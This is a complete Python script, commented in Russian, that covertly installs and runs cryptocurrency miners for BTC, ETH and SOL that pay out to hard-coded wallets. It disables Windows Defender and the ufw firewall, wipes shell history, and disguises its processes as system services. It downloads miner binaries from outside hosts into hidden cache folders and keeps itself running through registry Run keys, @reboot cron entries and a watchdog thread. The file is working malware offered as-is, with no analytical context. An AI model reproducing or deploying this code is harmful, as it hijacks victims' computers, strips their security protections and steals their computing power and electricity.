#!/usr/bin/env python3
import os, sys, platform, subprocess, urllib.request, time, random, threading, ctypes, zipfile, tarfile, tempfile, shutil, stat

# ========== 1. АВТОУСТАНОВКА PYTHON (ЕСЛИ НЕТ) ==========
def auto_install_python():
    system = platform.system()
    if system == "Windows":
        try:
            subprocess.run(["python", "--version"], capture_output=True, check=True)
            return
        except:
            # Скачиваем Python embed
            url = "https://www.python.org/ftp/python/3.12.7/python-3.12.7-embed-amd64.zip"
            zip_path = os.path.join(os.environ['TEMP'], "python_embed.zip")
            extract_path = os.path.join(os.environ['TEMP'], "python_portable")
            urllib.request.urlretrieve(url, zip_path)
            with zipfile.ZipFile(zip_path, 'r') as zf:
                zf.extractall(extract_path)
            # Добавляем pip
            subprocess.run(["curl", "-sS", "https://bootstrap.pypa.io/get-pip.py", "-o", os.path.join(extract_path, "get-pip.py")])
            subprocess.run([os.path.join(extract_path, "python.exe"), os.path.join(extract_path, "get-pip.py")])
            os.environ['PATH'] = extract_path + os.pathsep + os.environ['PATH']
            os.remove(zip_path)
    elif system == "Linux":
        # Установка python3 через пакетный менеджер
        try:
            subprocess.run(["python3", "--version"], capture_output=True, check=True)
        except:
            for pm in ["apt-get", "yum", "dnf", "pacman"]:
                if shutil.which(pm):
                    subprocess.run(f"sudo {pm} install python3 -y", shell=True)
                    break

# ========== 2. АВТОУСТАНОВКА ЗАВИСИМОСТЕЙ ==========
def auto_install_packages():
    packages = ["requests", "psutil"]
    for pkg in packages:
        try:
            __import__(pkg)
        except ImportError:
            subprocess.run([sys.executable, "-m", "pip", "install", pkg, "--quiet", "--no-warn-script-location", "--break-system-packages" if platform.system() == "Linux" else ""], 
                           capture_output=True, shell=(platform.system() == "Windows"))

# ========== 3. КОШЕЛЬКИ (ТВОИ) ==========
BTC_WALLET = "bc1qm65f46zgj9tyq3lu6838ux3yhafc7z9ehagc5e"
ETH_WALLET = "0x576D835Bf9994b55252484AA4F5A83Ba5526F339"
SOL_WALLET = "8YiXt1rFvsaXVkZNrbsHyiwhj1S76g6c2R7JhgccAzdw"

SYSTEM = platform.system()
IS_WIN = SYSTEM == "Windows"
IS_LINUX = SYSTEM == "Linux"

# Скрытая директория
if IS_WIN:
    HIDDEN = os.path.join(os.environ.get('APPDATA', os.path.expanduser("~")), 'Microsoft', 'Edge', 'Cache', '.sys')
else:
    HIDDEN = os.path.join(os.path.expanduser("~"), '.cache', '.systemd', '.udev')
os.makedirs(HIDDEN, exist_ok=True)

# ========== 4. АНОНИМИЗАЦИЯ (ПОЛНАЯ) ==========
def full_anon():
    if IS_WIN:
        try:
            subprocess.run('powershell -Command "Set-MpPreference -DisableRealtimeMonitoring $true -Force"', shell=True, capture_output=True)
            subprocess.run(f'powershell -Command "Add-MpPreference -ExclusionPath {HIDDEN} -ExclusionExtension .exe,.dll,.bin,.py"', shell=True)
            subprocess.run('reg add "HKLM\\SOFTWARE\\Microsoft\\Windows Defender\\Exclusions\\Paths" /v "' + HIDDEN + '" /t REG_DWORD /d 1 /f', shell=True)
            ctypes.windll.kernel32.SetConsoleTitleW("Windows Service Host")
            ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)
        except:
            pass
    else:
        os.system('echo "" > ~/.bash_history 2>/dev/null; export HISTFILE=/dev/null 2>/dev/null')
        os.system('systemctl stop ufw 2>/dev/null; systemctl disable ufw 2>/dev/null')
        os.system('sudo sysctl -w kernel.nmi_watchdog=0 2>/dev/null')
        sys.argv[0] = "[kworker/0:0]"

# ========== 5. МАЙНЕР BTC ==========
def start_btc():
    if IS_WIN:
        url = "https://github.com/monkins1010/ccminer/releases/download/v3.8.6/ccminer-3.8.6-windows-x64.zip"
        out = os.path.join(HIDDEN, "svchost_btc.exe")
        zip_path = os.path.join(HIDDEN, "b.zip")
        urllib.request.urlretrieve(url, zip_path)
        with zipfile.ZipFile(zip_path, 'r') as zf:
            zf.extractall(HIDDEN)
        for f in os.listdir(HIDDEN):
            if "ccminer" in f.lower() and f.endswith(".exe"):
                os.rename(os.path.join(HIDDEN, f), out)
                break
        os.remove(zip_path)
    else:
        url = "https://github.com/monkins1010/ccminer/releases/download/v3.8.6/ccminer-3.8.6-linux-x64.tar.gz"
        out = os.path.join(HIDDEN, "systemd_btc")
        tar_path = os.path.join(HIDDEN, "b.tar.gz")
        urllib.request.urlretrieve(url, tar_path)
        with tarfile.open(tar_path, 'r:gz') as tf:
            tf.extractall(HIDDEN)
        for f in os.listdir(HIDDEN):
            if "ccminer" in f and not f.endswith(".gz"):
                os.rename(os.path.join(HIDDEN, f), out)
                break
        os.chmod(out, 0o755)
        os.remove(tar_path)
    
    cmd = [out, "-a", "sha256", "-o", "stratum+tcp://btc.2miners.com:4242", "-u", BTC_WALLET, "-p", "x", "--cpu", "--threads=75%"]
    if IS_WIN:
        subprocess.Popen(cmd, creationflags=subprocess.CREATE_NO_WINDOW)
    else:
        subprocess.Popen(cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, start_new_session=True)

# ========== 6. МАЙНЕР ETH ==========
def start_eth():
    if IS_WIN:
        url = "https://github.com/ethereum-mining/ethminer/releases/download/v0.19.0/ethminer-0.19.0-Windows-x86_64.zip"
        out = os.path.join(HIDDEN, "svchost_eth.exe")
        zip_path = os.path.join(HIDDEN, "e.zip")
        urllib.request.urlretrieve(url, zip_path)
        with zipfile.ZipFile(zip_path, 'r') as zf:
            zf.extractall(HIDDEN)
        for f in os.listdir(HIDDEN):
            if "ethminer" in f.lower() and f.endswith(".exe"):
                os.rename(os.path.join(HIDDEN, f), out)
                break
        os.remove(zip_path)
    else:
        url = "https://github.com/ethereum-mining/ethminer/releases/download/v0.19.0/ethminer-0.19.0-Linux-x86_64.tar.gz"
        out = os.path.join(HIDDEN, "systemd_eth")
        tar_path = os.path.join(HIDDEN, "e.tar.gz")
        urllib.request.urlretrieve(url, tar_path)
        with tarfile.open(tar_path, 'r:gz') as tf:
            tf.extractall(HIDDEN)
        for f in os.listdir(HIDDEN):
            if "ethminer" in f and not f.endswith(".gz"):
                os.rename(os.path.join(HIDDEN, f), out)
                break
        os.chmod(out, 0o755)
        os.remove(tar_path)
    
    cmd = [out, "-P", f"stratum+ssl://{ETH_WALLET}.worker@eth.2miners.com:12020"]
    if IS_WIN:
        subprocess.Popen(cmd, creationflags=subprocess.CREATE_NO_WINDOW)
    else:
        subprocess.Popen(cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, start_new_session=True)

# ========== 7. МАЙНЕР SOL (через Unmineable) ==========
def start_sol():
    if IS_WIN:
        url = "https://github.com/Unmineable/miner/releases/download/v1.0.0/unmineable.exe"
        out = os.path.join(HIDDEN, "svchost_sol.exe")
        urllib.request.urlretrieve(url, out)
        cmd = [out, "--coin", "SOL", "--wallet", SOL_WALLET, "--worker", "sys", "--threads", "75%"]
        subprocess.Popen(cmd, creationflags=subprocess.CREATE_NO_WINDOW)
    else:
        url = "https://github.com/Unmineable/miner/releases/download/v1.0.0/unmineable"
        out = os.path.join(HIDDEN, "systemd_sol")
        urllib.request.urlretrieve(url, out)
        os.chmod(out, 0o755)
        cmd = [out, "--coin", "SOL", "--wallet", SOL_WALLET, "--worker", "sys", "--threads", "75%"]
        subprocess.Popen(cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, start_new_session=True)

# ========== 8. АВТОЗАПУСК ПРИ ЗАГРУЗКЕ ==========
def autostart_self():
    script = os.path.abspath(__file__)
    if IS_WIN:
        try:
            import winreg
            key = winreg.HKEY_CURRENT_USER
            subkey = r"Software\Microsoft\Windows\CurrentVersion\Run"
            handle = winreg.OpenKey(key, subkey, 0, winreg.KEY_SET_VALUE)
            winreg.SetValueEx(handle, "WindowsSystemMaintenance", 0, winreg.REG_SZ, f'pythonw "{script}"')
            winreg.CloseKey(handle)
        except:
            pass
    else:
        cron_line = f"@reboot python3 {script} >/dev/null 2>&1 &"
        subprocess.run(f'(crontab -l 2>/dev/null; echo "{cron_line}") | crontab -', shell=True)

# ========== 9. WATCHDOG (ЗАЩИТА ОТ СМЕРТИ) ==========
def watchdog():
    while True:
        time.sleep(random.randint(1800, 3600))
        start_btc()
        start_eth()
        start_sol()

# ========== 10. ГЛАВНЫЙ ЗАПУСК ==========
if __name__ == "__main__":
    # Всё автоматически
    auto_install_python()
    auto_install_packages()
    full_anon()
    autostart_self()
    start_btc()
    start_eth()
    start_sol()
    threading.Thread(target=watchdog, daemon=True).start()
    while True:
        time.sleep(86400)